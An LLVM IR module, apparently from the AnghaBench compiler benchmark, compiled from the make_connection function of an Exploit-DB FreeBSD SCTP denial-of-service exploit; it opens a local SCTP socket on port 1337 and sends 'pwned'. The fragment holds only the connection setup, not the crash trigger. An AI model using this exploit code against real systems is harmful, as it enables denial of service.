; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/freebsd/dos/extr_9373.c_make_connection.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/freebsd/dos/extr_9373.c_make_connection.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i32, %struct.TYPE_2__, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.sctp_sndrcvinfo = type { i32 }
%struct.sockaddr = type { i32 }

@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@IPPROTO_SCTP = common dso_local global i32 0, align 4
@csock = common dso_local global i32 0, align 4
@SIGALRM = common dso_local global i32 0, align 4
@recvdata = common dso_local global i32 0, align 4
@lsock = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [6 x i8] c"pwned\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @make_connection() #0 {
  %1 = alloca %struct.sockaddr_in, align 4
  %2 = alloca %struct.sctp_sndrcvinfo, align 4
  %3 = load i32, i32* @AF_INET, align 4
  %4 = load i32, i32* @SOCK_STREAM, align 4
  %5 = load i32, i32* @IPPROTO_SCTP, align 4
  %6 = call i32 @socket(i32 %3, i32 %4, i32 %5)
  store i32 %6, i32* @csock, align 4
  %7 = load i32, i32* @AF_INET, align 4
  %8 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i32 0, i32 2
  store i32 %7, i32* %8, align 4
  %9 = call i32 @htonl(i32 2130706433)
  %10 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i32 0, i32 1
  %11 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %10, i32 0, i32 0
  store i32 %9, i32* %11, align 4
  %12 = call i32 @htons(i32 1337)
  %13 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i32 0, i32 0
  store i32 %12, i32* %13, align 4
  %14 = load i32, i32* @csock, align 4
  %15 = bitcast %struct.sockaddr_in* %1 to %struct.sockaddr*
  %16 = call i32 @connect(i32 %14, %struct.sockaddr* %15, i32 12)
  %17 = load i32, i32* @SIGALRM, align 4
  %18 = load i32, i32* @recvdata, align 4
  %19 = call i32 @signal(i32 %17, i32 %18)
  %20 = getelementptr inbounds %struct.sctp_sndrcvinfo, %struct.sctp_sndrcvinfo* %2, i32 0, i32 0
  store i32 1337, i32* %20, align 4
  %21 = load i32, i32* @lsock, align 4
  %22 = call i32 @sctp_send(i32 %21, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str, i64 0, i64 0), i32 6, %struct.sctp_sndrcvinfo* %2, i32 0)
  ret void
}

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @htonl(i32) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @signal(i32, i32) #1

declare dso_local i32 @sctp_send(i32, i8*, i32, %struct.sctp_sndrcvinfo*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
